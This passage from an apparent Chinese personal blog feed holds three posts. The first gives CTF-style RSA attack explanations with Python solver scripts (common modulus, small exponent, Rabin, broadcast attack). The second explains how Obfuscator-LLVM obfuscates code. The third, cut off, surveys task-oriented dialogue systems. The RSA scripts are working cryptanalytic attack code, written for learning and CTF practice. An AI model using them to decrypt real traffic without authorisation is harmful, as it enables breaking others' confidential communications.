Crypto.Util.number <span class="keyword">import</span> inverse,long_to_bytes</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e1 = </span><br><span class="line">e2 = </span><br><span class="line">s = xgcd(e1,e2)</span><br><span class="line">s1 = s[<span class="number">0</span>]</span><br><span class="line">s2 = s[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = inverse(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = inverse(c2, n)</span><br><span class="line"></span><br><span class="line">m = pow(c1, s1, n)*pow(c2, s2, n) % n print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2><span id="pe-xiao-zhi-shu-gong-ji">e小指数攻击</span><a href="#pe-xiao-zhi-shu-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>当$e$很小的时候，例如2、3，此时可能可以通过直接暴力开根的方式进行攻击</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>以$e=3$为例，已知$c\equiv m^3 \mod n$，因此有：<br>$$m^3=c+kN$$</p><p>$$m=\sqrt[3]{c+kN}$$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n = </span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    a,b = gmpy2.iroot(c+i*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">1</span>):</span><br><span class="line">        print(long_to_bytes(a))</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2><span id="prabin-gong-ji">Rabin攻击</span><a href="#prabin-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>当指数$e=2$，且已知$p$和$q$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><ul><li><p>计算</p><p>$$m_p = \sqrt[2]{c} \mod p$$</p><p>$$m_q= \sqrt[2]{c} \mod q$$</p></li><li><p>扩展欧几里得求$y_p$和$y_q$</p><p>$$y_p p+y_q q=1$$</p></li><li><p>解得4个明文</p><p>$$a =\left(y_{p} \cdot p \cdot m_{q}+y_{q} \cdot q \cdot m_{p}\right) \bmod n $$</p><p>$$b =n-a $$</p><p>$$c =\left(y_{p} \cdot p \cdot m_{q}-y_{q} \cdot q \cdot m_{p}\right) \bmod n $$</p><p>$$d =n-c$$</p></li><li><p>条件：当$p\equiv q\equiv3 \mod 4$时，有</p><p>$$m_p=c^{(p+1)/4} \mod p$$</p><p>$$m_q=c^{(q+1)/4} \mod q$$</p></li></ul><h4><span id="pman-zu-tiao-jian-shi">满足条件时</span><a href="#pman-zu-tiao-jian-shi" class="header-anchor">#</a></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure><h4><span id="pbu-man-zu-tiao-jian-shi">不满足条件时</span><a href="#pbu-man-zu-tiao-jian-shi" class="header-anchor">#</a></h4><p>转换为模平方根问题</p><ul><li>用python（代码来自yuri）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exgcd</span><span class="params">(r0, r1)</span>:</span></span><br><span class="line">    x0, y0 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    x1, y1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    x, y = r0, r1</span><br><span class="line">    r = r0 % r1</span><br><span class="line">    q = r0 // r1</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        x, y = x0 - q * x1, y0 - q * y1</span><br><span class="line">        x0, y0 = x1, y1</span><br><span class="line">        x1, y1 = x, y</span><br><span class="line">        r0 = r1</span><br><span class="line">        r1 = r</span><br><span class="line">        r = r0 % r1</span><br><span class="line">        q = r0 // r1</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Jacobi</span><span class="params">(n, m)</span>:</span></span><br><span class="line">    n = n % m</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    Jacobi2 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (n &amp; <span class="number">1</span>):</span><br><span class="line">        k = (<span class="number">-1</span>) ** (((m**<span class="number">2</span> - <span class="number">1</span>) // <span class="number">8</span>) &amp; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (n &amp; <span class="number">1</span>):</span><br><span class="line">            Jacobi2 *= k</span><br><span class="line">            n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> Jacobi2</span><br><span class="line">    <span class="keyword">return</span> Jacobi2 * ((<span class="number">-1</span>) ** ((((m - <span class="number">1</span>) // <span class="number">2</span>) * ((n - <span class="number">1</span>) // <span class="number">2</span>)) &amp; <span class="number">1</span>)) * Jacobi(m % n, n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(b, m)</span>:</span> </span><br><span class="line">    M = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        M *= m[i]</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        ans += b[i] * M // m[i] * exgcd(M // m[i], m[i])</span><br><span class="line">    <span class="keyword">return</span> ans % M</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(a, p)</span>:</span></span><br><span class="line">    a_1 = gmpy2.invert(a, p)</span><br><span class="line">    s = p - <span class="number">1</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> s % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s &gt;&gt;= <span class="number">1</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = random.randint(<span class="number">1</span>, p<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">if</span> Jacobi(n, p) == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    b = pow(n, s, p)</span><br><span class="line">    x_t_1 = pow(a, (s+<span class="number">1</span>)//<span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> pow(b, <span class="number">2</span>**t, p) == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> pow(b, <span class="number">2</span>**(t<span class="number">-1</span>), p) == p<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    x, j, temp = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, t<span class="number">-1</span>):</span><br><span class="line">        x = pow(a_1*(x_t_1**<span class="number">2</span>), <span class="number">2</span>**(t<span class="number">-2</span>), p)</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> x == p<span class="number">-1</span>:</span><br><span class="line">            j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        t -= <span class="number">1</span></span><br><span class="line">        temp = x_t_1</span><br><span class="line">        x_t_1 = (x_t_1 * (b**(j**(<span class="number">2</span>**i)))) % p</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> temp, -temp % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">2</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">a, b = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = solve(c % p, p)</span><br><span class="line">        <span class="keyword">assert</span> pow(a[<span class="number">0</span>], e, p) == c % p</span><br><span class="line">        <span class="keyword">assert</span> pow(a[<span class="number">1</span>], e, p) == c % p</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b = solve(c % q, q)</span><br><span class="line">        <span class="keyword">assert</span> pow(b[<span class="number">0</span>], e, q) == c % q</span><br><span class="line">        <span class="keyword">assert</span> pow(b[<span class="number">1</span>], e, q) == c % q</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(CRT([a[<span class="number">0</span>],b[<span class="number">0</span>]],[p,q]))[<span class="number">2</span>:]))</span><br><span class="line">print(bytes.fromhex(hex(CRT([a[<span class="number">0</span>],b[<span class="number">1</span>]],[p,q]))[<span class="number">2</span>:]))</span><br><span class="line">print(bytes.fromhex(hex(CRT([a[<span class="number">1</span>],b[<span class="number">0</span>]],[p,q]))[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><ul><li>用sage</li></ul><p>使用一句话<code>Mod(c_square, q).sqrt(all=True)</code>分别求出$m_p$和$m_q$，代回去解得可能的明文</p><h2><span id="pn-fen-jie-gong-ji">n分解攻击</span><a href="#pn-fen-jie-gong-ji" class="header-anchor">#</a></h2><p>当n很小或者满足一定条件时，可以进行暴力分解</p><ul><li><p>yafu</p></li><li><p>factordb</p></li><li><p>当$d&lt;1/3 N^{1/4}$时，通过<strong>Wiener’s attack</strong>能够攻击得到$d$</p></li><li><p>当$p、q$十分接近时，可以使用费马分解分解$n$</p></li><li><p>当$q$较小，即$|p-q|$较大时，可以爆破$q$</p></li><li><p>当$d&lt;N^{0.292}$时，通过<strong>Boneh Durfee Method</strong>分解$n$</p></li></ul><h2><span id="pguang-bo-gong-ji">广播攻击</span><a href="#pguang-bo-gong-ji" class="header-anchor">#</a></h2><h3><span id="pchang-jing">场景</span><a href="#pchang-jing" class="header-anchor">#</a></h3><p>给定了不同的模数$n_i$，但指数$e$相同</p><p>已知:</p><p>$$c_1=m^e\mod n_1$$</p><p>$$c_2=m^e\mod n_2$$</p><p>$$c_3=m^e\mod n_3$$</p><h3><span id="pjie-fa">解法</span><a href="#pjie-fa" class="header-anchor">#</a></h3><p>使用中国剩余定理进行广播攻击</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">def broadcast(n1, n2 ,n3, c1, c2, c3):</span><br><span class="line">    n &#x3D; [n1, n2, n3]</span><br><span class="line">    C &#x3D; [c1, c2, c3]</span><br><span class="line">    N &#x3D; 1</span><br><span class="line">    for i in n:</span><br><span class="line">        N *&#x3D; i</span><br><span class="line"></span><br><span class="line">    Ni &#x3D; []</span><br><span class="line">    for i in n:</span><br><span class="line">        Ni.append(N &#x2F; i)</span><br><span class="line"></span><br><span class="line">    T &#x3D; []</span><br><span class="line">    for i in range(3):</span><br><span class="line">        T.append(long(invert(Ni[i], n[i])))</span><br><span class="line"></span><br><span class="line">    X &#x3D; 0</span><br><span class="line">    for i in range(3):</span><br><span class="line">        X +&#x3D; C[i] * Ni[i] * T[i]</span><br><span class="line"></span><br><span class="line">    m &#x3D; X % N</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line">n1 &#x3D; </span><br><span class="line">n2 &#x3D; </span><br><span class="line">n3 &#x3D; </span><br><span class="line">e &#x3D; </span><br><span class="line">c1 &#x3D; </span><br><span class="line">c2 &#x3D; </span><br><span class="line">c3 &#x3D; </span><br><span class="line">result &#x3D; broadcast(n1,n2,n3,c1,c2,c3)</span><br><span class="line">m &#x3D; iroot(result, e)</span><br><span class="line">print(long_to_bytes(result))</span><br></pre></td></tr></table></figure><h2><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h2><ul><li><a href="https://github.com/ctf-wiki/ctf-wiki" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki</a></li><li><a href="https://www.freebuf.com/articles/others-articles/161475.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/161475.html</a></li><li><a href="https://github.com/ius/rsatool/blob/master/rsatool.py" target="_blank" rel="noopener">https://github.com/ius/rsatool/blob/master/rsatool.py</a></li><li><a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></li><li><a href="https://xz.aliyun.com/t/2446#toc-18" target="_blank" rel="noopener">https://xz.aliyun.com/t/2446#toc-18</a></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>obfuscation &amp;&amp; deobfuscation(1)</title>
    <url>/cc7a6108.html</url>
    <content><![CDATA[<blockquote><p><a href="http://xn--deflat-917ig9cu2n9jev84j.py" target="_blank" rel="noopener">之前只会用deflat.py</a>，最近正好学了angr，而且看了下代码也只有三百行不到，所以打算对应着康康原理和代码</p><p>第一部分简单讲一下工具使用和obfuscation原理</p></blockquote><a id="more"></a><h3><span id="pobfuscator">obfuscator</span><a href="#pobfuscator" class="header-anchor">#</a></h3><p>是论文《Obfuscator-LLVM — Software Protection for the Masses》的研究成果</p><h4><span id="pan-zhuang">安装</span><a href="#pan-zhuang" class="header-anchor">#</a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git</span><br><span class="line">cd obfuscator</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake -DCMAKE_BUILD_TYPE=Release -DLLVM_INCLUDE_TESTS=OFF ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure><h4><span id="pzhi-ling-ti-huan">指令替换</span><a href="#pzhi-ling-ti-huan" class="header-anchor">#</a></h4><p>指令替换是将简单的运算替换为较为复杂的运算</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133324.jpg" alt="image-20200613001154466"></p><center>图1 指令替换表</center>目前支持将加法、减法、与、或、异或替换成等价的相对复杂的运算表达<p>使用时通过加入参数<code>-mllvm -sub</code>使用，并可以通过<code>-mllvm -sub_loop=num</code>指定替换的次数为<code>num</code>次，例如<code>-mllvm -sub_loop=3</code></p><h4><span id="pxu-jia-kong-zhi-liu">虚假控制流</span><a href="#pxu-jia-kong-zhi-liu" class="header-anchor">#</a></h4><p>虚假控制流是在原来的控制流图上，通过加入条件跳转语句跳转到一个原来的基本块或者是一个虚假的基本块，并最终跳转回条件跳转语句，引入循环结构，改变控制流图。</p><p>使用时通过加入参数<code>-mllvm -bcf</code>使用，也可以同上一样设置混淆次数<code>-mllvm -bcf_loop=num</code></p><p>文中使用的是论文团队之前的工作<code>Bogus Control Flow Insertion</code>，</p><p>举例：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;x;i++)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于上面的函数f，展开前和展开后的结果分别如图2，图3所示</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133332.jpg" alt="image-20200613002226907"></p><center>图2 加入虚假控制流之前的控制流图</center>![image-20200613002256501](https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133339.jpg)<center>图3 加入虚假控制流后的控制流图</center><h4><span id="pkong-zhi-liu-ping-tan-hua">控制流平坦化</span><a href="#pkong-zhi-liu-ping-tan-hua" class="header-anchor">#</a></h4><p>我们知道一个函数内存在自己的控制流和基本块，控制流平坦化，就是使用一个主分发块，通过条件控制分别进入不同的基本块，然后再回到主分发块，虽然逻辑和原来的程序相同，但分析起来更加复杂，类似于虚拟机，这里用腾讯博客中的图看起来条理比较清晰</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133349.jpg" alt="image-20200613204052796"></p><center>图4 控制流平坦化前</center>![image-20200613204121588](https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133354.jpg)<center>图5控制流平坦化后</center>注意：这里的基本块号其实标错了，但不影响简单的理解主分发器和基本块的关系<p>这里也给出论文里对函数f的控制流平坦化示例：</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133358.jpg" alt="image-20200613204513328"></p><center>图6 函数f控制流平坦化结果</center>在工具使用时，加入参数`-mllvm -fla`进行对控制流的平坦化处理，也可以加入`-mllvm -split`激活基本块细分，`-mllvm -split_num=num`将基本块分为`num`份<h3><span id="pshi-li-check-password">示例 check_password</span><a href="#pshi-li-check-password" class="header-anchor">#</a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_password</span><span class="params">(<span class="keyword">char</span> *passwd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!passwd[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += passwd[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (sum == <span class="number">0x1a1</span> &amp;&amp; passwd[<span class="number">3</span>] &gt; <span class="string">'c'</span> &amp;&amp; passwd[<span class="number">3</span>] &lt; <span class="string">'e'</span> &amp;&amp; passwd[<span class="number">0</span>] == <span class="string">'b'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((passwd[<span class="number">3</span>] ^ <span class="number">0xd</span>) == passwd[<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Orz..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"len error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (check_password(argv[<span class="number">1</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Congratulation!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="pzheng-chang-bian-yi">正常编译</span><a href="#pzheng-chang-bian-yi" class="header-anchor">#</a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc check_passwd.c -o check_passwd</span><br></pre></td></tr></table></figure><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133404.jpg" alt="image-20200613210045156"></p><h4><span id="pkong-zhi-liu-ping-tan-hua-bian-yi">控制流平坦化编译</span><a href="#pkong-zhi-liu-ping-tan-hua-bian-yi" class="header-anchor">#</a></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/build/bin/clang check_passwd.c -o check_passwd_flat -mllvm-fla</span><br></pre></td></tr></table></figure><p>emmmm，太大了，还是用腾讯的图好了</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-133409.jpg" alt="image-20200613210742907"></p><h3><span id="pcan-kao-zi-liao">参考资料</span><a href="#pcan-kao-zi-liao" class="header-anchor">#</a></h3><ul><li><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fobfuscator-llvm%2Fobfuscator%2Fwiki%2FInstallation" target="_blank" rel="noopener">https://github.com/obfuscator-llvm/obfuscator/wiki/Installation</a></p></li><li><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FHikariObfuscator%2FHikari" target="_blank" rel="noopener">https://github.com/HikariObfuscator/Hikari</a></p></li><li><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FGoSSIP-SJTU%2FArmariris" target="_blank" rel="noopener">https://github.com/GoSSIP-SJTU/Armariris</a></p></li><li><p><a href="https://github.com/cq674350529/deflat/blob/master/flat_control_flow/deflat.py" target="_blank" rel="noopener">https://github.com/cq674350529/deflat/blob/master/flat_control_flow/deflat.py</a></p></li><li><p><a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/112</a></p></li><li><p>论文：Obfuscator-LLVM — Software Protection for the Masses</p></li></ul>]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>面向任务的对话系统</title>
    <url>/599bbf87.html</url>
    <content><![CDATA[<blockquote><p>​ 在对话系统领域中，面向任务的对话系统是其中很重要的一个分支，不同于开放域的对话系统，任务型对话系统侧重于完成一个领域或者几个领域内的特定任务，例如天气查询、餐厅预订等。面向任务的对话系统能够分为pipeline方法和end-to-end方法两类，并依赖相关领域内的知识库。本文首先介绍pipeline和end-to-end两类方法，然后简单介绍在面向任务的对话系统研究中使用的数据集，最后结合近三年中面向任务的对话系统领域内的研究成果，梳理当前存在的主要挑战。</p></blockquote><a id="more"></a><h2><span id="ppipeline-de-fang-fa">pipeline的方法</span><a href="#ppipeline-de-fang-fa" class="header-anchor">#</a></h2><p>​ 图1.1所示为基于pipeline的面向任务的对话系统结构，它由自然语言理解（NLU）、对话状态跟踪（DST）、对话策略学习和自然语言生成（NLG）这四个关键部分组成：</p><p>​ (1) 自然语言理解：将用户的自然输入，生成预定义的语义槽。</p><p>​ (2) 对话状态跟踪：管理每个回合的对话输入和之前的对话历史，并输出当前的对话状态。</p><p>​ (3) 对话策略：根据当前的对话状态学习下一个动作。</p><p>​ (4) 自然语言生成：根据对话策略生成的动作，将其映射到自然语言，生成对话系统的响应。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132601.jpg" alt="img"></p><center>图1.1 基于pipeline的面向任务的对话系统结构[1]</center><h2><span id="pend-to-end-de-fang-fa">end-to-end的方法</span><a href="#pend-to-end-de-fang-fa" class="header-anchor">#</a></h2><p>​ 传统的面向任务的对话系统需要许多领域内的人工干预（例如手工编写规则、提取特征），这导致在一个领域中表现很好的方法在另一个领域中应用时不容易快速适应。对于pipeline的方法，主要存在两个问题：第一个问题是是信用分配问题(credit assignment problem)，最终用户的反馈很难传播到每个上游模块。第二个问题是组件之间的相互依赖。一个组件的输入取决于另一个组件的输出。当一个组件适应新环境或用新数据重新训练时，所有其他组件都需要相应地调整，以确保全局优化。</p><p>​ 与pipeline的方法不同，end-to-end的方法使用单个模块并与结构化的外部知识库进行交互，目前使用的方法有基于神经网络、强化学习等。</p><h2><span id="pchang-yong-shu-ju-ji">常用数据集</span><a href="#pchang-yong-shu-ju-ji" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-132612.jpg" alt="img"></p><center>图3.1 面向任务的对话系统数据集[1]</center>由于在面向任务的对话系统构建中需要不同领域内的知识和数据，因此研究员也收集了形成了不同的语料库（图3.1）。<ul><li><p>DSTC：提供了第一个用于对话状态跟踪的通用测试平台和评估套件。</p></li><li><p>DSTC2: 在对话状态跟踪任务中引入了一些其他功能。对话状态也使用更加丰富的表示形式，包括用户目标的slot-value属性等，在交互过程中，存在一个匹配实体的数据库。</p></li><li><p>bAbI：设计用于五个面向任务的对话任务。这些任务以基础知识库为基础，涵盖多个对话阶段，并评估模型的功能，包括对话管理、知识库查询等。</p></li><li><p>CamRest：应用了WOZ范式，是测试一个回合，数据相对干净</p></li><li><p>MTB：通过Amazon Mechanical Turk收集并由专家注释，常用于强化学习方法评估</p></li><li><p>KVRET：内容包含车内助理的三个领域(日历调度、天气检索和导航)，对话通过知识库建立，因此十分适合构建能够使用知识进行推理的模型</p></li><li><p>Frames：为了研究面向任务的对话系统的存储能力以及如何向用户提供知识库信息而开发的。</p></li><li><p>M2M：通过框架收集，能够快速引导任意领域中的end-to-end对话。进通过提供任务模式和API客户端即可支持特定任务的对话。</p></li><li><p>Air Dialog：定义了一个目标驱动的对话，以一对上下文为条件，最终达到目标状态，它支持三个对话任务：对话生成、状态跟踪和对话重现。</p></li><li><p>MultiWOZ：是一个跨七个领域的大型语料库，每个对话都由一系列对话状态和系统动作进行注释。</p></li><li><p>CoSQL：用于构建通用的知识库查询对话系统，每个对话都模拟了实际的知识库查询场景。</p></li><li><p>MultiDoGo：是一个大型对话数据集，带有意图类型和slot标签。</p></li><li><p>SGD：研究了模式指导的方法，能够轻松集成新的服务和API。</p></li><li><p>CrossWOZ：第一个面向任务的中文数据集，着重于跨领域的用户目标。数据集包含了丰富的对话状态及用户和系统对话行为标签，以及用户模拟器和几个基准模型。</p></li></ul><h2><span id="pjin-qi-yan-jiu-he-cun-zai-tiao-zhan">近期研究和存在挑战</span><a href="#pjin-qi-yan-jiu-he-cun-zai-tiao-zhan" class="header-anchor">#</a></h2><p>​ 从对pipeline的方法和end-to-end的方法介绍中可以看到，在面向任务对话系统中，存在的问题主要有以下三个[1]：</p><p>​ (1) 数据有效性问题：特定领域内数据的收集和整理需要耗费大量的人力和时间，因此需要提高已搜集领域数据的有效性。</p><p>​ (2) 多轮对话策略问题：在多轮对话中，对话策略强调目标导向，在每一轮中的系统动作应该和之前的对话保持一致，因此通过对多轮对话策略的研究，能够有效提提升多轮对话中对话系统的性能。</p><p>​ (3) 